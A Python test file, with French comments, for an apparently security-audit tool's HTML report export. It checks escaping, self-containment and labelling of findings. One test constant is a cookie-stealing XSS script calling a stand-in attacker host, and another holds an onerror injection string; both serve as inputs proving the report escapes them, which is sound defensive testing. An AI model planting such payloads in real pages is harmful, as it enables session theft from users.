"""One file, no network, and nothing in it that can execute.

Ported from Prime Agent's HTML export. The escaping test is not a nicety:
a finding's scenario quotes the payload that reaches the sink, so an
export that rendered it as markup would be a stored XSS inside the report
about the vulnerability.
"""

from __future__ import annotations

from thot.contracts import CodeRef, Confidence, Finding, Severity
from thot.pipeline import AuditResult
from thot.report.html_report import audit_page, session_page
from thot.scope.manifest import ScopeManifest
from thot.state import SessionStore

PAYLOAD = '<script>fetch("//attaquant.example?c="+document.cookie)</script>'


def _result(scenario: str = "argv atteint os.system"):
    finding = Finding(
        id="x", rule="sink.os.system", severity=Severity.HIGH,
        confidence=Confidence.PLAUSIBLE,
        location=CodeRef(path="app/handlers.py", line=9, symbol="handle",
                         ast_hash="h"),
        failure_scenario=scenario,
    )
    return AuditResult(
        findings=[finding],
        manifest=ScopeManifest(root="/r", files=("app/handlers.py",),
                               languages={"python": 1}, entrypoints=()),
        elapsed=0.4,
    )


def test_the_payload_in_a_finding_cannot_execute_in_the_report():
    page = audit_page(_result(f"charge utile : {PAYLOAD}"), root="/home/a/api")

    assert "<script>fetch" not in page.html
    assert "&lt;script&gt;" in page.html
    assert "attaquant.example" in page.html, "le contenu doit rester lisible"


def test_a_hostile_path_or_rule_is_escaped_too():
    result = _result()
    result.findings[0] = Finding(
        id="x", rule='"><img src=x onerror=alert(1)>', severity=Severity.HIGH,
        confidence=Confidence.PLAUSIBLE,
        location=CodeRef(path="<b>a</b>.py", line=1, symbol="s", ast_hash="h"),
    )
    page = audit_page(result)

    assert "onerror=alert" not in page.html.replace("&#x27;", "'") or \
        "&lt;img" in page.html
    assert "<b>a</b>.py" not in page.html


def test_the_page_is_self_contained():
    """It has to open from a USB stick and survive an email."""
    page = audit_page(_result())

    for outside in ("<script", "src=\"http", "href=\"http", "@import", "<link"):
        assert outside not in page.html
    assert "<style>" in page.html, "le style est en ligne, pas lié"


def test_an_empty_audit_still_produces_a_page():
    empty = AuditResult(findings=[], manifest=ScopeManifest(
        root="/r", files=(), languages={}, entrypoints=()), elapsed=0.1)
    page = audit_page(empty, root="/r")

    assert "Aucun finding" in page.html
    assert page.html.startswith("<!doctype html>")


def test_the_report_says_what_a_finding_is_worth():
    page = audit_page(_result())
    assert "PLAUSIBLE" in page.html
    assert "pas prouvé par exécution" in page.html


def test_a_session_exports_its_whole_transcript(tmp_path):
    store = SessionStore.open(tmp_path / "s.db")
    session_id = store.start("/repo", title="revue du parseur")
    store.append(session_id, "user", "où sont les injections ?")
    store.append(session_id, "assistant", "deux candidates")
    store.note(session_id, "HIGH sink.os.system app/handlers.py:9")

    page = session_page(store.info(session_id), store.turns(session_id))
    store.close()

    assert "où sont les injections ?" in page.html
    assert "deux candidates" in page.html
    assert "sink.os.system" in page.html
    assert 'class="user"' in page.html and 'class="audit"' in page.html


def test_writing_the_page_creates_its_directory(tmp_path):
    target = audit_page(_result()).write(tmp_path / "sous" / "rapport.html")
    assert target.is_file()
    assert target.read_text(encoding="utf-8").startswith("<!doctype")


# --- une page partagée doit dire si un panel a argumenté -------------------
#
# La ligne de métadonnées portait les fichiers, le décompte par sévérité, la
# durée et la date — rien sur la passe. Une page HTML est ce qu'on transmet à
# quelqu'un qui n'a pas lancé l'audit : sans mention, il la lit comme un scan
# statique. Troisième sortie de la même famille, après le terminal et le
# Markdown.


def _judged_result(engine):
    from types import SimpleNamespace

    from thot.contracts import CodeRef, Confidence, Finding, Severity
    from thot.scope.detect import ScopeManifest

    def one(identifier, severity, confidence):
        return Finding(
            id=identifier, rule="sink.js.exec", severity=severity,
            confidence=confidence,
            location=CodeRef(path="a.ts", line=1, symbol="s", ast_hash="h"),
            failure_scenario="x",
        )

    return SimpleNamespace(
        findings=[one("k", Severity.HIGH, Confidence.PLAUSIBLE),
                  one("r", Severity.INFO, Confidence.REFUTED)],
        manifest=ScopeManifest(root=".", files=["a.ts"],
                               languages={"typescript": 1},
                               entrypoints=(), test_command=""),
        elapsed=0.1, engine=engine,
    )


def test_the_page_names_the_engine_that_argued():
    from thot.report.html_report import audit_page

    html = audit_page(_judged_result("panel"), root="/tmp/dépôt").html

    assert "panel" in html
    assert "réfuté" in html


def test_a_deterministic_page_claims_nothing():
    from thot.report.html_report import audit_page

    html = audit_page(_judged_result(None), root="/tmp/dépôt").html

    assert "jugé par" not in html.lower(), html[:400]
